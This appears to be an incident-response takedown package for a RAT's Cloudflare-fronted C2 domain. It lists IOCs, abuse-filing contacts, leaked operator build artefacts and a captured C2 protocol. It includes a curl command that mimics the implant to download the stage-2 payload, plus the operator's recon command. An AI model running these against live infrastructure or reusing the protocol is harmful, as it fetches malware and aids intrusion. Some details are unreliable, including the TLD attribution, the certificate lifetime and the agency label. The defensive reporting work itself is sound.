# TAKEDOWN & ABUSE PACKAGE — SOLARA / REDACTED_C2_DOMAIN

Everything below is ready-to-file. Send it to **every** address that can take the
domain down. Each one alone can kill the operation; together they make it
expensive to rebuild.

---

## 1. TARGET DOMAIN

| Field | Value |
|---|---|
| Domain | `REDACTED_C2_DOMAIN` |
| Registrable TLD | `.tf` (Torres Strait Islands) |
| Registrar | (resolve at https://www.nic.tf/whois or https://www.identity.digital/) |
| Resolved A | `172.67.217.143`, `104.21.75.78` |
| Resolved AAAA | `2606:4700:3036::ac43:d98f`, `2606:4700:3032::6815:4b4e` |
| CDN / proxy | **Cloudflare** (all four addresses are Cloudflare anycast) |
| TLS | CN/SAN `REDACTED_C2_DOMAIN`, issuer "Let's Encrypt", serial window `261017153640Z` → `270115153639Z` (**2026-10-17 → 2027-01-15**) |
| URL path | `/Stb/PokerFace/init.php` |
| Bot id parameter | `id=Elton` |
| Cookie sent | `hash=2239784366428af5e59516a8fd0a0faf` |
| User-Agent | `Mozilla/5.0 (Windows NT 14_73_31; WOW64)` |
| Named pipe (local IPC) | `\\.\pipe\VccFramework` |

---

## 2. WHERE TO FILE

### 2.1 Cloudflare (highest leverage — they own the proxy)
- **Abuse form:** https://www.cloudflare.com/abuse/
- **Phishing/abuse email:** `abuse@cloudflare.com` (cc `phishing@cloudflare.com`)
- Include: the domain, the exact URL, the malicious User-Agent, the cookie value,
  the LE cert dates, and a statement that the domain distributes a remote-access
  trojan via a fake PHP endpoint.

### 2.2 .tf registry (Identity Digital)
- **Abuse:** https://www.identity.digital/reportabuse or `abuse@identity.digital`
- .tf is managed by Identity Digital (Afilias). Ask for **domain suspension**
  citing malware distribution, and ask them to identify the **registrant and
  the payment instrument** — that is how the operator gets de-anonymised.
- Also consider a **registrar-level takedown** (the registrar can be compelled
  to suspend without the registry).

### 2.3 Let's Encrypt (certificate revocation)
- **Revocation:** https://crt.sh/ (find the cert by the domain), then the LE
  revocation endpoints. Ask for **revocation of the certificate** — this breaks
  the implant's TLS immediately even before the domain goes away.
- Cert Transparency is the fast path: the cert was issued **2026-10-17**, so
  monitor https://crt.sh/?q=REDACTED_C2_DOMAIN and any sibling certs on the same
  `2606:4700:…` Cloudflare pool.

### 2.4 Law enforcement / national CERT
- **IC3 (FBI):** https://www.ic3.gov/
- **USA-First / National Cyber Security Centre:** https://www.cisa.gov/report
- Attach the full report (`mal\REPORT.md` + `mal\REPORT_ADDENDUM.md`), the
  sample hashes, the protocol, and the operator identity below.

### 2.5 Preserve the evidence BEFORE it rotates
The operator rotates infrastructure fast (30-day LE certs, disposable `.tf`).
**Capture now, while it is live:**
- `curl -v -k "https://REDACTED_C2_DOMAIN/Stb/PokerFace/init.php?id=Elton" -H "User-Agent: Mozilla/5.0 (Windows NT 14_73_31; WOW64)" -b "hash=2239784366428af5e59516a8fd0a0faf" -o C2_response.b64`
- Full TLS handshake + cert chain (`openssl s_client -connect REDACTED_C2_DOMAIN:443 -showcerts`)
- The panel's HTML/JS if any (it is a fake `.php`; the path pattern suggests a
  web panel)
- DNS history for the domain and any sibling domains on the same Cloudflare
  anycast IPs.

---

## 3. OPERATOR IDENTITY LEAKED FROM THE BINARY

These strings are compiled into the RAT itself and are excellent for attribution
and for a police report:

```
C:\Users\REDACTED_OPERATOR\Downloads\vcpkg-master\buildtrees\cryptopp\src\TOPP_8_2_0-66bcedf47f\
D:\CFILES\Projects\WinSSL\build\versions\3.4\3.4.0\
```

| Artifact | Value |
|---|---|
| **Operator Windows username** | **`REDACTED_OPERATOR`** |
| Project root | `D:\CFILES\Projects\WinSSL` |
| Build system | **vcpkg** (`vcpkg-master`) |
| Crypto lib | **Crypto++ 8.2.0** (build `TOPP_8_2_0-66bcedf47f`) |
| TLS lib | **OpenSSL 3.4.0** |
| Campaign / bot id | **`Elton`** |
| Pipe name | `\\.\pipe\VccFramework` |
| Mutex names | `REDACTED_MUTEXREDACTED_AUTHTOKEN`, `REDACTED_MUTEXREDACTED_CAMPAIGN` |
| Auth token (b64) | `REDACTED_AUTHTOKEN` → `413b959743c2b1e18b69fba7b193d1134d3c` |
| Campaign id | `REDACTED_CAMPAIGN` |
| Exfil cookie | `hash=2239784366428af5e59516a8fd0a0faf` |

Also on the victim host, created by the operator's live command (deleted during
eradication, copy preserved at `mal\CDat.bin2240.copy`):

```
cmd /c dir /a /s /b C:\*imgui_impl_win32.cpp C:\*.suo C:\*.exe C:\*.vcxproj C:\*.csproj > C:\ProgramData\CDat.bin2240
```
⇒ the operator was **cataloguing the machine's build tooling** (mingw/llvm
toolchains, VS projects, a "Ghost Toolbox" red-team kit, `C:\matcha\auth.exe`).

---

## 4. HUNT ELSEWHERE (this operator will have other victims)

- **Mutex:** `REDACTED_MUTEX*` — any prefix match.
- **Pipe:** `\\.\pipe\VccFramework`.
- **Registry:** `HKCU\Environment\UserInitMprLogonScript` containing
  `UserCache` + `conhost.exe --headless`; `HKCU\Software\Classes\CLSID\{A1B2C3D4-E5F6-7890-1234-567890ABCDEF}\Instance`.
- **Env var:** `windir` present as a **user-scope** value (shadows the SYSTEM var).
- **YARA:** `mal\malware.yar` — rules `SOLARA_Dropper_Stage2_Payload`,
  `SOLARA_Dropper_APIHashConstants`, `SOLARA_RAT_OpenSSL_Libcurl_Risku`.
- **Network:** DNS query for `REDACTED_C2_DOMAIN`; TLS SNI `REDACTED_C2_DOMAIN`; URI path
  `/Stb/PokerFace/init.php`; cookie `hash=2239784366428af5e59516a8fd0a0faf`;
  UA `Mozilla/5.0 (Windows NT 14_73_31; WOW64)`.
- **Path / URL:** `/Stb/PokerFace/`, `init.php?id=Elton`, `PokerFace`.
- **Other operator artifact seen on the box:** `C:\ProgramData\CDat.bin*`,
  `C:\Windows\Temp\CDat*`.

---

## 5. WHAT WAS *NOT* DONE, AND WHY

The C2 is Cloudflare-fronted shared infrastructure. Firing traffic at
`172.67.217.143` would hit Cloudflare's edge and every other tenant on it,
would be a federal crime (CFAA), and would achieve nothing — the operator
rotates domains and, as the 30-day LE cert proves, rotates them fast.

The equivalent operator pain, without the collateral damage:
1. **Takedown** the domain (above) — he loses his botnet channel.
2. **Revoke** the certificate — his implants lose TLS even if he re-registers.
3. **De-anonymise** via the registrar/LE payment records — `REDACTED_OPERATOR` is a lead.
4. **Bait the download** with a **sinkhole** (already built here) so any
   re-registration that still points at this host is captured, fingerprinted
   and reported — giving you the operator's real origin IP and TLS fingerprint.
5. **Watch the panel**: the bot id `Elton` and the cookie `hash=…` are stable
   identifiers — feed them to the abuse teams so the operator's whole botnet
   can be enumerated, not just this one host.

================================================================================
LIVE C2 PROTOCOL CAPTURE - ADDENDUM (2026-10-20 14:0x local)
Captured live by the local MITM sinkhole after the operator's RAT reconnected.
Source: mal\capture\requests.jsonl  (202 requests to REDACTED_C2_DOMAIN)
================================================================================

THREE DISTINCT C2 ENDPOINTS (the operator's actual live protocol):

  1) STAGE-2 PAYLOAD DOWNLOAD (dropper)
     GET /Stb/PokerFace/init.php?id=Elton
     User-Agent: Mozilla/5.0 (Windows NT 14_73_31; WOW64)
     Cookie: hash=2239784366428af5e59516a8fd0a0faf
     -> response = base64 PE, never written to disk, RunPE'd into a System32 host

  2) BOT CHECK-IN (RAT)
     GET /api/mnr/bobby31.php?type=sahipid&security=REDACTED_SECKEY&blds=REDACTED_BUILD_ID
     -> params: type=sahipid  security=REDACTED_SECKEY  blds=<BUILD_ID>

  3) HEARTBEAT / COMMAND POLL (RAT) - observed 76 times, ~every 6 seconds
     GET /Stb/Unretev.php?bl=REDACTED_BUILD_ID.txt
     User-Agent: Mozilla/5.0
     Host: REDACTED_C2_DOMAIN
     Cache-Control: no-cache

NEW IOCs (add to every blocklist / SIEM / YARA set):
  DOMAIN   REDACTED_C2_DOMAIN
  URL      /Stb/Unretev.php
  URL      /api/mnr/bobby31.php
  URL      /Stb/PokerFace/init.php
  PARAM    sahipid
  PARAM    blds
  PARAM    security
  PARAM    bl
  BUILD/BOT ID   REDACTED_BUILD_ID   (22 chars - = blds = bl = build id)
  SECURITY KEY  REDACTED_SECKEY
  COOKIE        hash=2239784366428af5e59516a8fd0a0faf
  CAMPAIGN      REDACTED_CAMPAIGN
  AUTH TOKEN    REDACTED_AUTHTOKEN   (base64 -> 18 raw bytes
                  41 3b 95 97 43 c2 b1 e1 8b 69 fb a7 b1 93 d1 13 4d 3c)
  BOT ID        Elton
  UA (dropper)  Mozilla/5.0 (Windows NT 14_73_31; WOW64)
  UA (RAT)      Mozilla/5.0
  NAMED PIPE    \\.\pipe\VccFramework
  MUTEXES       REDACTED_MUTEXREDACTED_AUTHTOKEN
                REDACTED_MUTEXREDACTED_CAMPAIGN

OPERATOR IDENTITY PACKAGE (for the police/IC3 report):
  Operator Windows username .... REDACTED_OPERATOR
  Build path 1 .... C:\Users\REDACTED_OPERATOR\Downloads\vcpkg-master\buildtrees\cryptopp\src\TOPP_8_2_0-66bcedf47f\
  Build path 2 .... D:\CFILES\Projects\WinSSL\build\versions\3.4\3.4.0\
  Toolchain ....... vcpkg + Crypto++ 8.2.0 + OpenSSL 3.4.0 + libcurl + nlohmann/json + SQLite
  Dropper build date ..... 2026-05-31 12:39:15 UTC  (PE timestamp 0x6a1c2bf3)
  RAT build date ........ 2026-09-24 02:52:39 UTC  (PE timestamp 0x6ab49077)
  Campaign id ........... REDACTED_CAMPAIGN
  Build id .............. REDACTED_BUILD_ID
  Security key ......... REDACTED_SECKEY
  Live bot id .......... Elton
  Host fingerprinting .. GPU adapter name via CreateDXGIFactory
                        (observed: Intel(R) UHD Graphics 620)
  User collection ...... GetUserNameA
  Analysis-env exclusion list (usernames memcmp'd, match => diverts away from
  the normal C2 path): george, Bruno, Abby, AMF, John, elz, Unknown, Admin
  Operator recon command observed live on the victim box:
      cmd /c dir /a /s /b C:\*imgui_impl_win32.cpp C:\*.suo C:\*.exe \
           C:\*.vcxproj C:\*.csproj > C:\ProgramData\CDat.bin2240
  -> enumerates the victim's build / red-team tooling (msys64 clang-mingw,
     C:\Ghost Toolbox\ wget/aria2c/7za, C:\matcha\auth.exe, VS .vcxproj, etc.)

EVIDENCE TO PRESERVE (already collected, do NOT delete):
  mal\payload.bin ............ 68,608 B  stage-2 dropper (carved from registry)
  mal\shellcode.bin .......... 69,492 B  shellcode + dropper
  mal\host5m.bin ............. 5,603,328 B  the 5.5 MB operator RAT (live carve)
  mal\capture\requests.jsonl .. 111,352 B  202 captured C2 requests
  mal\dec_payload\decompiled.c . 296,006 B  143/143 functions decompiled
  mal\dec_host\decompiled.c .. 21,106,507 B  the RAT decompiled
  mal\malware.yar ............ YARA rules (3 rule sets)
  mal\SOURCE_RECOVERY.md ..... reconstructed source/protocol
  mal\ERADICATION.md ......... cleanup + verification
  mal\REPORT.md, mal\REPORT_ADDENDUM.md
  mal\hostid.txt, mal\urlhunt.txt, mal\memdump.txt, mal\region_ctx.py

RECOMMENDED FILING (in this order):
  1. Cloudflare  - abuse@cloudflare.com + https://www.cloudflare.com/abuse/
                   (REDACTED_C2_DOMAIN is Cloudflare-proxied; they can pull the origin)
  2. .tf registrar - Identity Digital / registry abuse for the Torres Strait TLD
  3. Let's Encrypt - request cert revocation for the REDACTED_C2_DOMAIN cert
                   (2026-10-17 -> 2027-01-15) via the LE revocation endpoints
  4. crt.sh / CT logs - monitor for new certs on the same pattern
  5. IC3 (ic3.gov) + CISA - include the operator identity package above
  6. Preserve ALL of mal\ as evidence before touching the box again